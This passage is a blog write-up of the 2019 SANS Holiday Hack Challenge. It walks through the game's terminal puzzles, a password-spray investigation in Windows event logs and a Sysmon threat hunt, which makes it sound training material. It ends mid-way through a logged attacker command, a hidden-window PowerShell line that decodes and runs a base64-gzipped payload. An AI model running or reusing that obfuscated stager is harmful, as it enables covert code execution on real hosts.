---
layout: post
title:  "2019 SANS Holiday Hack Challenge write-up"
date:   2019-12-20
categories: security
---

For the past couple of years, SANS has spoiled us with an excellent annual "Holiday hack challenge".

## The elves

Similarily to the previous editions, the elves faces some relatively easy issues. If we manage to help them, they'll throw us some pretty useful hints for the main objectives.
So let's solve their problem first!

### Bushy Evergreen

In the lobby, Bushy is stuck in an opened `ed` session.
A quick look at [ed documentation](https://www.gnu.org/software/ed/manual/ed_manual.html) lets us know that `q` is the command we're looking for.

### Tangle Coalbox

After getting into the courtyard and heading east, we meet Tangle who needs to guess the keypad's 4-digits code.
{% highlight python %}
print("Re-type the python script here")
{% endhighlight %}

### Kent Tinseltooth

Now, heading north, we enter into the students union building and meet Kent, who's struggling with iptables. He wants to configure his firewall rules as follow;
1. Set the default policies to DROP for the INPUT, FORWARD, and OUTPUT chains.
2. Create a rule to ACCEPT all connections that are ESTABLISHED,RELATED on the INPUT and the OUTPUT chains.
3. Create a rule to ACCEPT only remote source IP address 172.19.0.225 to access the local SSH server (on port 22).
4. Create a rule to ACCEPT any source IP to the local TCP services on ports 21 and 80.
5. Create a rule to ACCEPT all OUTPUT traffic with a destination TCP port of 80.
6. Create a rule applied to the INPUT chain to ACCEPT all traffic from the lo interface.

`iptables` syntax is pretty straightforward, and there's no trick here. The five first rules can be directly adapted from the rules given in [the hint](https://upcloud.com/community/tutorials/configure-iptables-centos/), but for the last one, we'll need the option `-i` which is not mentioned there:

{% highlight bash %}
# Set the default policies to DROP for the INPUT, FORWARD, and OUTPUT chains.
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT DROP

# Create a rule to ACCEPT all connections that are ESTABLISHED,RELATED on the INPUT and the OUTPUT chains.
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# Create a rule to ACCEPT only remote source IP address 172.19.0.225 to access the local SSH server (on port 22).
sudo iptables -A INPUT -p tcp --dport 22 -s 172.19.0.225 -j ACCEPT

# Create a rule to ACCEPT any source IP to the local TCP services on ports 21 and 80.
sudo iptables -A INPUT -p tcp --dport 21 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT

# Create a rule to ACCEPT all OUTPUT traffic with a destination TCP port of 80.
sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT

# Create a rule applied to the INPUT chain to ACCEPT all traffic from the lo interface.
sudo iptables -A INPUT -i lo -j ACCEPT
{% endhighlight %}

It can take a few seconds for the game to detect that the firewalling rules are ok.

### SugarPlum Mary

Let's now get out of the building, and head east to the Hermey Hall. Right in front of us stands SugarPlum Mary, who just wants to list the files in in home directory.
Someone played a trick on him, and running `ls` justs output: `This isn't the ls you're looking for`

So which `ls` is actually used here?
{% highlight bash %}
$ which ls
/usr/local/bin/ls
{% endhighlight %}

A quick look at [the filesystem hierachy](https://en.wikipedia.org/wiki/Filesystem_Hierarchy_Standard) tells us that something as essential as `ls` should be in `/bin`.
And indeed, `/bin/ls` is there and correctly lists the files in our friend's home directory.

### Alabaster Snowball

Let's now go into the Speaker UNpreparedness Room, where we meet Alabaster. This elf wants to log in (using his completely secure login and passwords), and land into in a Bash shell. As you probably guessed, the natural way (`sudo alabaster_password`) will not exactly work (but you should definitely try first).

As mentioned in the hints, the users shell is determined by the contents of /etc/passwd
{% highlight bash %}
$ cat /etc/passwd | grep alabaster_snowball
alabaster_snowball:x:1001:1001::/home/alabaster_snowball:/bin/nsh
{% endhighlight %}

`/bin/nsh` does not look like a legit shell. Let's have a first look at it:
{% highlight bash %}
$ ls -larth /bin/nsh
-rwxrwxrwx 1 root root 74K Dec 11 17:40 /bin/nsh
{% endhighlight %}

Oh wow! Free for all! Let's just replace it with `/bin/bash` then:
{% highlight bash %}
$ cp /bin/bash /bin/nsh
cp: cannot create regular file '/bin/nsh': Operation not permitted
{% endhighlight %}

That's not what I expected. Please not that the error message is not `Permission denied`: this is NOT a permission issue. A little bit of Googling shows us that this error message comes up when one tries to remove/alter an [immutable file](https://www.tecmint.com/make-file-directory-undeletable-immutable-in-linux/).
This requires root permissions though. But fortunately, runnin `sudo -l` shows that our current user can run `chattr` as root!

{% highlight bash %}
$ sudo chattr -i /bin/nsh
$ cp /bin/bash /bin/nsh
$ su alabaster_snowball
Password:
Loading, please wait......



You did it! Congratulations!
{% endhighlight %}

### Holy Evergeen

We're done with the Speaker UNpreparedness Room; let's get out, and step into the Netwars room. Here we're greeted by Holly Evergreen, who is unable to find his way to the exam solutions stored in Mongo.

{% highlight bash %}
$ mongo
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27017
2019-12-20T21:42:53.525+0000 W NETWORK  [thread1] Failed to connect to 127.0.0.1:27017, in(checkin
g socket for error after poll), reason: Connection refused
2019-12-20T21:42:53.525+0000 E QUERY    [thread1] Error: couldn't connect to server 127.0.0.1:2701
7, connection attempt failed :
connect@src/mongo/shell/mongo.js:251:13
@(connect):1:6
exception: connect failed
{% endhighlight %}

So `mongod` is either not running on this machine, or not listening on the default port 27017. We can try to find the listening port of `mongod` using netstat, but we'll need to be root... Let's see what we can do:
{% highlight bash %}
$ sudo -l
User elf may run the following commands on f12e9b6f53e3:
    (mongo) NOPASSWD: /usr/bin/mongod --quiet --fork --port 12121 --bind_ip 127.0.0.1
        --logpath\=/tmp/mongo.log
    (root) SETENV: NOPASSWD: /usr/bin/python /updater.py
{% endhighlight %}

Funny: we can see here the port used by `mongod` :) Let's connect to the database server which listens on port 12121: `mongo localhost:12121`

For those familiar with SQL and not familiar with Mongo, Mongo provides a ["mapping chart"](https://docs.mongodb.com/manual/reference/sql-comparison/) that can help to "translate" Mongo concepts into their SQL counterpart.

{% highlight javascript %}
> db
test
> show collections
redherring
> db.redherring.find()
{ "_id" : "This is not the database you're looking for." }
> show dbs
admin   0.000GB
config  0.000GB
elfu    0.000GB
local   0.000GB
test    0.000GB
> use elfu
switched to db elfu
> show collections
bait
chum
line
metadata
solution
system.js
tackle
tincan
> db.solution.find()
{ "_id" : "You did good! Just run the command between the stars: ** db.loadServerScripts();displaySolution(); **" }
{% endhighlight %}


The first database we landed in (`test`) does not contain much, so we switch to the more promising `elfu` database, and see an appealing collection named `solution`. It contains only one document, which gives us the key of this enigma. Running this last command `db.loadServerScripts();displaySolution();` in the mongo shell will unlock the solution!

### Sparkle Redberry
Only one to go! Let's get out of the Netwars room, and enter the laboratory. Sparkle Redberry is waiting near the computer-piloted laser, with the hardest elf challenge (in my opinion). Looking at the number of people standing in the room at the time I'm writing this, I believe I'm not the only one who struggled with this one.

TODO picture here

Note: I was a bit reluctant to code using PowerShell at first. But this challenge is actually not trivial, and I don't think one can complete it by adapting PowerShell one-liners found on Stackoverflow. Hence I learned a bit of PowerShell for this, and I'm glad I did: the language is consistent, well documented, and often feels way cleaner than the shell script I usually write on Unix.

Let's start! As advised in the welcome message, let's have a look at the laser-controlling API description:
{% highlight powershell %}
(Invoke-WebRequest -Uri http://localhost:1225/).RawContent
...
----------------------------------------------------
Christmas Cheer Laser Project Web API
----------------------------------------------------
Turn the laser on/off:
GET http://localhost:1225/api/on
GET http://localhost:1225/api/off

Check the current Mega-Jollies of laser output
GET http://localhost:1225/api/output

Change the lense refraction value (1.0 - 2.0):
GET http://localhost:1225/api/refraction?val=1.0

Change laser temperature in degrees Celsius:
GET http://localhost:1225/api/temperature?val=-10

Change the mirror angle value (0 - 359):
GET http://localhost:1225/api/angle?val=45.1

Change gaseous elements mixture:
POST http://localhost:1225/api/gas
POST BODY EXAMPLE (gas mixture percentages):
O=5&H=5&He=5&N=5&Ne=20&Ar=10&Xe=10&F=20&Kr=10&Rn=10
{% endhighlight %}

There are 4 parameters that can be set using the API, and we need to find the optimal value for each and every one of them in order to get an output of more than 5 Mega-Jollies!

#### Mirror angle value
The riddle starts with the file `/home/callingcard.txt`, as hinted in the message displayed when we log in:

{% highlight powershell %}
PS /home/elf> Get-Content /home/callingcard.txt
What's become of your dear laser?
Fa la la la la, la la la la
Seems you can't now seem to raise her!
Fa la la la la, la la la la
Could commands hold riddles in hist'ry?
Fa la la la la, la la la la
Nay! You'll ever suffer myst'ry!
Fa la la la la, la la la la
{% endhighlight %}

History... Indeed, it's always good to look at the command history to start a scavenging hunt! In PowerShell, we'll do that using the cmdlet `Get-History`

{% highlight powershell %}
PS /home/elf> Get-History

  Id CommandLine
  -- -----------
   1 Get-Help -Name Get-Process
   2 Get-Help -Name Get-*
   3 Set-ExecutionPolicy Unrestricted
   4 Get-Service | ConvertTo-HTML -Property Name, Status > C:\services.htm
   5 Get-Service | Export-CSV c:\service.csv
   6 Get-Service | Select-Object Name, Status | Export-CSV c:\service.csv
   7 (Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContent
   8 Get-EventLog -Log "Application"
   9 I have many name=value variables that I share to applications system wide. At a command I w…
  10 (Invoke-WebRequest -Uri http://localhost:1225/).RawContent
  11 Get-Content /home/callingcard.txt
{% endhighlight %}

There we go! We can see that someone has set the mirror angle value using the Web API (command 7) to *65.5 degrees*.

#### Lense refraction

We also notice a weird command 9. Let's have a deeper look into this one:

{% highlight powershell %}
PS /home/elf> ( Get-History -Id 9 ).CommandLine
I have many name=value variables that I share to applications system wide. At a command I will rev
eal my secrets once you Get my Child Items.
{% endhighlight %}

This description reminds me of environment variables. These are certainly available in PowerShell too, right ...? [Yep they are!](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_variables?view=powershell-6) Let's list them:
{% highlight powershell %}
PS /home/elf> Set-Location Env:
PS Env:/> Get-ChildItem

Name                           Value
----                           -----
_                              /bin/su
DOTNET_SYSTEM_GLOBALIZATION_I… false
HOME                           /home/elf
HOSTNAME                       02ecb3c03407
LANG                           en_US.UTF-8
LC_ALL                         en_US.UTF-8
LOGNAME                        elf
MAIL                           /var/mail/elf
PATH                           /opt/microsoft/powershell/6:/usr/local/sbin:/usr/local/bin:/usr/s…
PSModuleAnalysisCachePath      /var/cache/microsoft/powershell/PSModuleAnalysisCache/ModuleAnaly…
PSModulePath                   /home/elf/.local/share/powershell/Modules:/usr/local/share/powers…
PWD                            /home/elf
RESOURCE_ID                    a5aaabcd-2574-4b9b-bbf4-cf2927201e5e
riddle                         Squeezed and compressed I am hidden away. Expand me from my priso…
SHELL                          /home/elf/elf
SHLVL                          1
TERM                           xterm
USER                           elf
USERDOMAIN                     laserterminal
userdomain                     laserterminal
USERNAME                       elf
username                       elf
{% endhighlight %}

The variable named `riddle` smells like a hint. Its content is:
> Squeezed and compressed I am hidden away. Expand me from my prison and I will show you the way. Recurse through all /etc and Sort on my LastWriteTime to reveal im the newest of all.

No need to be smart here: let's get the most recently updated file in `/etc`. This can be done by:
* Listing all the files in `/etc` (and its subfolders): this can be done using the cmdlet `Get-ChildItem` with the option `-Recurse`
* Sort them by last edition date: this can be done using the cmdlet [`Sort-Object`](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/sort-object?view=powershell-6)
* And only keeping the last one: this can be done using `Select-Object` with the option `-Limit`


{% highlight powershell %}
> Get-ChildItem -Path /etc -Recurse | Sort-Object LastWriteTime | Select-Object -Last 1

    Directory: /etc/apt

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
--r---          12/20/19 11:20 PM        5662902 archive
{% endhighlight %}

This tells us that the last edited file in `/etc` is `/etc/apt/archive`. Based on its name, it's an archive, which adds up with the previous hint. Let's try to see what inside! The cmdlet `Expand-Archive` allows us to uncompress it:

{% highlight powershell %}
PS /home/elf> Expand-Archive -LiteralPath /etc/apt/archive -DestinationPath /home/elf
PS /home/elf> Get-ChildItem ./refraction/

    Directory: /home/elf/refraction
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------           11/7/19 11:57 AM            134 riddle
------           11/5/19  2:26 PM        5724384 runme.elf
{% endhighlight %}

The file `runme.elf` is a binary file; looking at its first bytes, it looks like a x86-64 [ELF file](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format#File_header):
{% highlight powershell %}
PS /home/elf> Get-Content ./refraction/runme.elf | format-hex | Select-Object -First 1


                       00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
00000000000000000000   7F 45 4C 46 02 01 01 00 00 00 00 00 00 00 00 00  ELF............
00000000000000000010   02 00 3E 00 01 00 00 00 75 1A 40 00 00 00 00 00  ..>.....u.@.....
...
{% endhighlight %}

It's not possible to execute the file as it is though. Trying to do so will yield a very obscure error. I actually spent quite some time here, until I realized that `chmod` was the only binary I could use in `/bin`. So I tried to make `runme.elf` executable using `chmod`, and it worked!

{% highlight powershell %}
> ./runme.elf
Program 'runme.elf' failed to run: No such file or directoryAt line:1 char:1
+ ./runme.elf
+ ~~~~~~~~~~~.
At line:1 char:1
+ ./runme.elf
+ ~~~~~~~~~~~
+ CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
+ FullyQualifiedErrorId : NativeCommandFailed

> chmod +x ./runme.elf
> ./runme.elf
refraction?val=1.867
{% endhighlight %}

And here is our second parameter! The lense refraction must be set to *1.867*.

#### Temperature

When we un-compressed the archive in the step above, we not only obtained the ELF file, but also a riddle:
> Very shallow am I in the depths of your elf home. You can find my entity by using my md5 identity:
>
> 25520151A320B5B0D21561F92C8F6224

We can brute-force our way in, by looking at every file in the folder `/home/elf/depths` (recursively), computing its MD5 digest, and comparing it with the given value.

{% highlight powershell %}
> $files = Get-ChildItem -Path ./depths/ -Recurse
> foreach ($file in $files) {
        if ((Get-Item $file) -is [System.IO.DirectoryInfo]) {
            continue;
        }
        $hash = (Get-FileHash $file -Algorithm MD5 -ErrorAction SilentlyContinue)
        if (!($hash -eq $null) -and ($hash.Hash.Contains("25520151A320B5B0D21561F92C8F6224"))) {
            echo "$file"
        }
    };
/home/elf/depths/produce/thhy5hll.txt

> Get-Content /home/elf/depths/produce/thhy5hll.txt
temperature?val=-33.5
I am one of many thousand similar txt's contained within the deepest of /home/elf/depths. Finding
me will give you the most strength but doing so will require Piping all the FullName's to Sort Len
gth.
{% endhighlight %}

We got the third parameter: the temperature must be set to -33.5.

#### Gas composition

The fourth and last parameter will require several steps. Let's start from the hint that was given together with the temperature value:

>I am one of many thousand similar txt's contained within the deepest of /home/elf/depths. Finding
>me will give you the most strength but doing so will require Piping all the FullName's to Sort Length.

We want to find the *deepest* files in `./depth`: we can do that by:
* Looping over all the files in `./depth`
* For each file, compute a new field called `Depth`, which is the length of it's attribute `FullName`. [This can be done using Select-Object](https://4sysops.com/archives/add-a-calculated-property-with-select-object-in-powershell/).
* Then sort the files by Depth, and keeps the 2 deepest file (just in case there's an ex-aequo).

Translated into PowerShel:
{% highlight powershell %}
Get-ChildItem -Path ./depths -Recurse | Select-Object FullName, @{Name = 'Depth'; Expression = {$_.FullName.Length}} | sort Depth | Select-Object -Last 2 | Format-List -Property *
    FullName : /home/elf/depths/larger/cloud/behavior/beauty/enemy/produce/age/chair/unknown/
               escape/vote/long/writer/behind/ahead/thin/occasionally/explore/tape/wherever/p
               ractical/therefore/cool/plate/ice/play/truth/potatoes/beauty/fourth/careful/da
               wn/adult/either/burn/end/accurate/rubbed/cake/main/she/threw/eager/trip/to/soo
               n/think/fall/is/greatest/become/accident/labor/sail/dropped/cjfuro1d.txt
    Depth    : 384

    FullName : /home/elf/depths/larger/cloud/behavior/beauty/enemy/produce/age/chair/unknown/
               escape/vote/long/writer/behind/ahead/thin/occasionally/explore/tape/wherever/p
               ractical/therefore/cool/plate/ice/play/truth/potatoes/beauty/fourth/careful/da
               wn/adult/either/burn/end/accurate/rubbed/cake/main/she/threw/eager/trip/to/soo
               n/think/fall/is/greatest/become/accident/labor/sail/dropped/fox/0jhj5xz6.txt
    Depth    : 388
{% endhighlight %}

Here is our file! But we're not there yet: the file contains another riddle.
{% highlight powershell %}
Get-Content /home/elf/depths/.../fox/0jhj5xz6.txt
Get process information to include Username identification. Stop Process to show me you're skilled and in this order they must be killed:

bushy
alabaster
minty
holly

Do this for me and then you /shall/see
{% endhighlight %}

(Please note that the content of the file will actually change for each and every attempt)

We need to kill the process belonging to the user listed below *in the correct order*. Nothing complicated here, as `Get-Process` (with the option `-IncludeUserName`) will let us list the ongoing processes and the user who started them. Once the process are killed, the file `/shall/see` becomes readable:

{% highlight powershell %}
Get-Process -IncludeUserName

     WS(M)   CPU(s)      Id UserName                       ProcessName
     -----   ------      -- --------                       -----------
     28.73     1.74       6 root                           CheerLaserServi
    214.16    30.30      31 elf                            elf
      3.52     0.02       1 root                           init
      0.75     0.00      25 bushy                          sleep
      0.78     0.00      26 alabaster                      sleep
      0.83     0.00      27 minty                          sleep
      0.73     0.00      29 holly                          sleep
      3.25     0.00      30 root                           su

Stop-Process 25
Stop-Process 26
Stop-Process 27
Stop-Process 29
Get-Content /shall/see
Get the .xml children of /etc - an event log to be found. Group all .Id's and the last thing will be in the Properties of the lonely unique event Id.
{% endhighlight %}

Another riddle?! Don't worry, that's the last one. Following the hint, let's look for an XML file in `/etc`

{% highlight powershell %}
Get-ChildItem -Path /etc -Recurse -Include *xml -ErrorAction SilentlyContinue
{% endhighlight %}

`/etc/systemd/system/timers.target.wants/EventLog.xml`: this looks like an event log file, which corroborates the hint. Great! After looking at the file structure, we can see that each event has a property that looks like: `<I32 N="Id">X</I32>`, where `X` is an integer. Let's find the "lonely unique event Id":

{% highlight powershell %}
Get-Content /etc/systemd/system/timers.target.wants/EventLog.xml | Select-String 'N="Id"' | group | Select-Object -Property Count,Name

Count Name
----- ----
    1       <I32 N="Id">1</I32>
   39       <I32 N="Id">2</I32>
  179       <I32 N="Id">3</I32>
    2       <I32 N="Id">4</I32>
  905       <I32 N="Id">5</I32>
   98       <I32 N="Id">6</I32>
{% endhighlight %}

As expected, there is one Id (<I32 N="Id">1</I32>) which appears only once in the document. If we have not been lied to, this event should be interesting. Here's a PowerShell script that this display this event only:

{% highlight powershell %}
[xml]$data = Get-Content /etc/systemd/system/timers.target.wants/EventLog.xml
foreach ($event in $data.Objs.Obj) {
    foreach ($i32prop in $event.Props.I32) {
        if (($i32prop.N -eq "Id") -and ($i32prop.InnerText -eq "1")) {
            echo $event.InnerXml
        }
    }
}
{% endhighlight %}

By carefully inspecting the result, we finally find the holy grail: the optimal gas composure!
{% highlight xml %}
<Obj RefId="18016">
   <TNRef RefId="1806" />
   <ToString>System.Diagnostics.Eventing.Reader.EventProperty</ToString>
   <Props>
      <S N="Value">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c "`$correct_gases_postbody = @{`n    O=6`n    H=7`n    He=3`n    N=4`n    Ne=22`n    Ar=11`n    Xe=10`n    F=20`n    Kr=8`n    Rn=9`n}`n"</S>
   </Props>
</Obj>
{% endhighlight %}

Finally, we can assemble the jigsaw puzzle:

{% highlight powershell %}

(Invoke-WebRequest -Uri http://127.0.0.1:1225/api/angle?val=65.5).RawContent
(Invoke-WebRequest -Uri http://localhost:1225/api/refraction?val=1.867).RawContent
(Invoke-WebRequest -Uri http://localhost:1225/api/temperature?val=-33.5).RawContent

$correct_gases_postbody = @{
    O=6
    H=7
    He=3
    N=4
    Ne=22
    Ar=11
    Xe=10
    F=20
    Kr=8
    Rn=9
    }
(Invoke-WebRequest -Uri http://localhost:1225/api/gas -Method Post -Form $correct_gases_postbody).RawContent

(Invoke-WebRequest -Uri http://localhost:1225/api/output).RawContent
#Only 3.38 Mega-Jollies of Laser Output Reached! What ?!
#Please don't tell me that we need to restart the system...
(Invoke-WebRequest -Uri http://localhost:1225/api/off).RawContent
(Invoke-WebRequest -Uri http://localhost:1225/api/on).RawContent
(Invoke-WebRequest -Uri http://localhost:1225/api/output).RawContent
#There we go! 6.72 Mega-Jollies.
{% endhighlight %}

Wow, that was a lot for an elf puzzle! We're now all warmed up for the main objectives.

## Main objectives

You can click on your badge and go in the "Objectives" to get, at any time, a recap of your objectives. For (almost) each challenge, we'll be able to use some hints given by the elves we helped.

Contrary to the elves challenges, you'll need from now to work on your computer, and to install various open-source tools in order to quickly crack the problems. I usually don't want to do that on my computer (as I'll typically not need any of these tools in the foreseeable future), so I set up a Fedora virtual machine and worked exclusively inside this VM.

### Unredact Threatening Document

Let's go out of the crowded laboratory and breath some fresh air in the courtyard. In the noth-east corner of the courtyard, we find something that looks like [a blackmail addressed to the university staff](https://downloads.elfu.org/LetterToElfUPersonnel.pdf).

Someone wanted to hide most of the blackmail's content, by hiding it with a "Confidential" sticker. This is yet another example of a frequent mistake: instead of removing the information, the person just added a sticker on top of it, hoping to hide it. This means that the secret information is somehow still present in the file.

There are probably hundreds of ways to retrieve it. I opened the document in Chrome's builtin PDF view, and realized that the text was selectable! A simple copy-paste from Chrome to my favourite text editor revealed the letter:

> Date: February 28, 2019
>
> To the Administration, Faculty, and Staff of Elf University
> 17 Christmas Tree Lane
> North Pole
>
> From: A Concerned and Aggrieved Character
>
> Subject: DEMAND: Spread Holiday Cheer to Other Holidays and Mythical Characters… OR
> ELSE!
>
>
> Attention All Elf University Personnel,
>
> It remains a constant source of frustration that Elf University and the entire operation at the
> North Pole focuses exclusively on Mr. S. Claus and his year-end holiday spree. We URGE
> you to consider lending your considerable resources and expertise in providing merriment,
> cheer, toys, candy, and much more to other holidays year-round, as well as to other mythical
> characters.
>
> For centuries, we have expressed our frustration at your lack of willingness to spread your
> cheer beyond the inaptly-called “Holiday Season.” There are many other perfectly fine
> holidays and mythical characters that need your direct support year-round.
>
> If you do not accede to our demands, we will be forced to take matters into our own hands.
> We do not make this threat lightly. You have less than six months to act demonstrably.
>
> Sincerely,
>
> --A Concerned and Aggrieved Character

### Windows Log Analysis: Evaluate Attack Outcome

> We're seeing attacks against the Elf U domain! Using [the event log data](https://downloads.elfu.org/Security.evtx.zip), identify the user account that the attacker compromised using a password spray attack. Bushy Evergreen is hanging out in the train station and may be able to help you out.

The hints given by Bushy Evergeen suggest to look at this open-source tool called [DeepBlueCLI](https://github.com/sans-blue-team/DeepBlueCLI).
This tool comes in two flavours: there's a Python version and a PowerShell version. As much as we enjoyed playing with PowerShell during the previous elf challenge, let's use the python version for now.

The most painful part of the set-up is actually to install [libevtx](https://github.com/libyal/libevtx), on which the Python version of DeepBlueCLI relies. I'm not quite sure what this library is doing, but it requires an insane amount of dependencies. </grumble>

After libevtx is correctly installed, we should be able to run DeepBlueCLI on our `evtx` file:

{% highlight bash %}
$ python DeepBlue.py ../Security.evtx
$
{% endhighlight %}

What? Nothing happened ? Are we using this tool correclty? Let's check out the Python version readme:
>DeepBlueCLI, ported to Python. Designed for parsing evtx files on Unix/Linux.
>
>Current version: alpha. It supports command line parsing for Security event log 4688, PowerShell log 4014, and Sysmon log 1. Will be porting more functionality from DeepBlueCLI after DerbyCon 7.

How unlucky we are. The Python version contains only a limited subset of the PowerShell version, and nothing related to password spray. We can try to fall back to the PowerShell version (I actually tried), but we won't get far: [Get-WinEvent is, as of now, a Windows-only cmdlet](https://github.com/PowerShell/PowerShell/issues/5810).

Alright, let's roll up our sleeves and implement the password spray detection in the Python version of DeepBlueCLI.

(An hour passes)

Alright, we ported the password spray detection algorithm already implemented in PowerShell version to the Python version. If you're interested, the [pull request](https://github.com/sans-blue-team/DeepBlueCLI/pull/15) is pending.

The result is still a bit underwhelming though; we have a list of users who were targetted by the spray attack, but no easy way to know which one got compromised. Diving into the details of `DeepBlue.py`, we see that the parsing is actually done by `evtxexport`. So let's try to use it directly to analyze the events

{% highlight bash %}
$ evtxexport ../Security.evtx  > result
$ cat result | grep -B 5 0x00001228 | grep "Creation time" | head -n1
Creation time     : Nov 19, 2019 12:21:44.263822500 UTC
$ cat result | grep -B 5 0x00001228 | grep "Creation time" | tail -n1
Creation time     : Nov 19, 2019 12:22:51.594765600 UTC
{% endhighlight %}

It looks like the spray attack happened on November 19th, from 12:21:44 to 12:22:51.
Do we see any successfull login ([eventid 4624](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624)) at that time? Using a couple of greps (with the handy options `A` and `B`, allowing to keep lines surrounding the matching lines), we can extract the users (6th string of the event's data) who managed to login at that time.

{% highlight bash %}
$ cat result | grep "0x00001210" -B 5 -A 28 | grep "Nov 19, 2019 12:2[12]" -A 32 | grep "String: 6" | sort | uniq
String: 6     : DC1$
String: 6     : pminstix
String: 6     : supatree
{% endhighlight %}

`supatree` is the only user who was identified as a target by DeepBlueCLI: he's the victim.

Given that this objective's difficulty was rated 1/5, I was definitely expecting something more straightforward, and I wouldn't be surprised if there is a much simpler way to identify the victim.

### Windows Log Analysis: Determine Attacker Technique

> Using [these normalized Sysmon logs](https://downloads.elfu.org/sysmon-data.json.zip), identify the tool the attacker used to retrieve domain password hashes from the lsass.exe process. For hints on achieving this objective, please visit Hermey Hall and talk with SugarPlum Mary.

Let's follow the hints given by Mary. We have at our disposal some data captured by sysmon, formatted in JSON. In case you don't know what sysmon is (I did not know), the [first link](https://www.darkoperator.com/blog/2014/8/8/sysinternals-sysmon) given by Mary states that sysmon basically logs:

> * Process Creation with full command line for both current and parent processes. In addition it will record the hash of the process image using either MD5, SHA1 or SHA256. In addition it will record the process GUID when it is created for better correlation since Windows may reuse a process PID.
> * Network connection from the host to another. It records source process, IP addresses, port numbers, hostnames and port names for TCP/UDP connections.
> * Changes to the file creation time of a file.
> * Generates events from early in the boot process to capture activity made by even sophisticated kernel-mode malware.

The first bullet is especially interesting in our case, as it seems that some kind of malware was used to retrieve domain password hashes. A first look at the file shows that is data is pretty well structured (in JSON), and probably too big to be inspected with a simple text editor.

The [second hint given by Mary](https://pen-testing.sans.org/blog/2019/12/10/eql-threat-hunting/) says that EQL is the perfect tool for this job. Its syntax looks super similar to the one of Splunk, for instance. But we don't have a Splunk instance ready for use, so let's give it a try. This [animation](https://asciinema.org/a/dQHwBytDOpemwRQI6gUc95fng) gives a pretty good idea of how to start a shell, load some data and start querying.

{% highlight bash %}
eql> input ./sysmon-data.json
Using file ./sysmon-data.json with 2626 events

eql> search process where parent_process_name == "lsass.exe"
{"command_line": "C:\\Windows\\system32\\cmd.exe", "event_type": "process", "logon_id": 999, "parent_process_name": "lsass.exe", "parent_process_path": "C:\\Windows\\System32\\lsass.exe", "pid": 3440, "ppid": 632, "process_name": "cmd.exe", "process_path": "C:\\Windows\\System32\\cmd.exe", "subtype": "create", "timestamp": 132186398356220000, "unique_pid": "{7431d376-dedb-5dd3-0000-001027be4f00}", "unique_ppid": "{7431d376-cd7f-5dd3-0000-001013920000}", "user": "NT AUTHORITY\\SYSTEM", "user_domain": "NT AUTHORITY", "user_name": "SYSTEM"}
1 result found

# let's check what this guy did
eql> search process where logon_id == 999
...
2402 results found

# Wow, this "guy" was active! Most of the events look like login attempts with frequently used passwords.
# Let's not look at these, but at what this guy did with powershell instead.
eql> search process where logon_id == 999 and command_line == "*powershell*"
...
{"command_line": "\"C:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe\" -noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAKne010CA7VWbW/aSBD+nEj5D1aFhK0QjANtmkiVbs2bITiBGMxb0Wljr83C2gZ7DZhe//uNAaepmt61J52Vl/XuzOzMM8/M2Il9i9PAF2JdaQhfLs7PujjEniDmaOVDQcjtzYRz6ewMDnKb7W74KHwSxClarWqBh6k/u7urxmFIfH58LzYJR1FEvGdGSSRKwl/CcE5CcvX4vCAWF74IuT+LTRY8Y3YSS6rYmhPhCvl2etYJLJz6UzRWjHIx//lzXppeKbNifR1jFol5I4k48Yo2Y3lJ+CqlF/aTFRHzOrXCIAocXhxSv3xdHPgRdsgDWNsQnfB5YEd5CcKAn5DwOPSFY0CpheO5mIdlNwwsZNshiaJ8QZimtqez2R/i9HTxU+xz6pFiy+ckDFYGCTfUIlFRw77NyBNxZqBl8JD67kySQGwTLImY82PGCsLvmBEfyDaD7VeVxNdKINXloVSAXL4VqB7YMSNH1fwbnqYEkOB5IQGA9/Xi/OLcySjjd25fMwZWZ9PDmoB7YjeI6EHsk1AqCDrcg3kQJvCa64cxkWYv4Aq5Zd2ghZ/rK5kwiHqm/ecA9qZmQO0Z6Jxymks26e7PmVkjDvVJLfGxR62MfOJbKBOHkUOExUzsAXwS86cDYtcIIy7mKWxpsn9Qq3uUv+iqMWU2CZEFmYrAK0ii9L0zx0yI+ZavEw8gOr4D+3IOUJ5k0ieaJ9nt6TsI5asMR1FB6MZQc1ZBMAhmxC4IyI/o6QjFPDgs89/c1WPGqYUjnpmbSUcUT7dVAz/iYWxBziDyvrEiFsUsBaIgaNQmamJQN7s1/yYMVcwYlAFY2kAaYCcN3+ApE0Jw8JB1qWgQ3vJWjHggcyj9BsMuFPqJ7AfqYJfY+e/9y5h8pG2KQwbAK+8guQYLeEEwacihf6SYHgj0325/1TrAj2pITlkQs9KYqglPGZ2zrZSMJ0gOAIQcgm+EgafiiHyoHDuE+E5+pFUEz7jlM91Sl1RBW6q0dPgd0HIrqN3Y9+2FJoe13dxBraila91aT9Mqm7ZhVrhRb/H7bovr9dFiYSDtaTDmkxbS+rS0HFf2qzbdGx1kj3fyh72635bU3X7h2s645jjujWM8Ke8btDOs9tTSNe7U6nFnqG7VUiWq063Wo4Pest3gz2OT4YEjuyPlFtNdJ1yYSqDvWwg152Vr33bM5ly3k7FGyUIudWgP9RC6t54Gg6a7cpsRkm/NddVboHUDI4xaqG4m7fdM7Q0aKhrU1R5+DLrly5qsTOx1vTEZ4bbH7KYmK+MRslEo9925cvM491OcsKuu1VQGdSZJQwaZbgVplWu6n6x7TRfVQcb0AoQbdDm4HIHNhz7oDAeKHSDut0aybLqyixxjPsZIBWl1